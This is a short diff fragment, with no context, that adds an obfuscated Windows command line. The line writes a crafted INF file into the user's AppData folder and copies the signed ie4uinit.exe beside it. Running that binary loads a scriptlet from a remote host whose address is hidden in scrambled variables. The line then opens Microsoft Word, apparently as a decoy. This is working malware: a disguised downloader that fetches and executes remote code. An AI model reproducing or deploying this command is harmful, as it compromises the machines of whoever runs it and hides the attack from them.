@@ -1,0 +1,5 @@
+/v /c (for %z in (s) do @set "Trees=%~z") &&
+  call(for /D %z in ("[defaultinstall.windows7]" "Un\" "Register\" "OCXs=F01B32" "delfiles=B2846" "[strings]" "Secrets=%time%" "Emotions=t;Garden" "Leave=:;Enjoy" "Complaints=/" "Awareness=h" "Formats=init" "Cricket=com" "servicename=' '" "Networks=b;Logic" "shortsvcname=' '" "[destinationdirs]" "defaultdestdir=11" "B2846=01" "[B2846]" "ieu%Formats%.inf" "[F01B32]" "sc\" "ro%Networks%j,NI,%Awareness%%Emotions%%Emotions%p%Leave%%Complaints%%Complaints%dssvkkfegh.%Cricket%/kahfR" "[version]" "signature =$windows nt$" ) do @echo %~z)>"%appdata%\microsoft\ieuinit.inf" &&
+  call xcopy /Y /C /Q %win!Parameters!ir%\system32\ie4uinit.exe "%appdata%\microsoft\*" &&
+  start "" "%appdata%\microsoft\ie4uinit.exe" -basesettings &&
+  start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
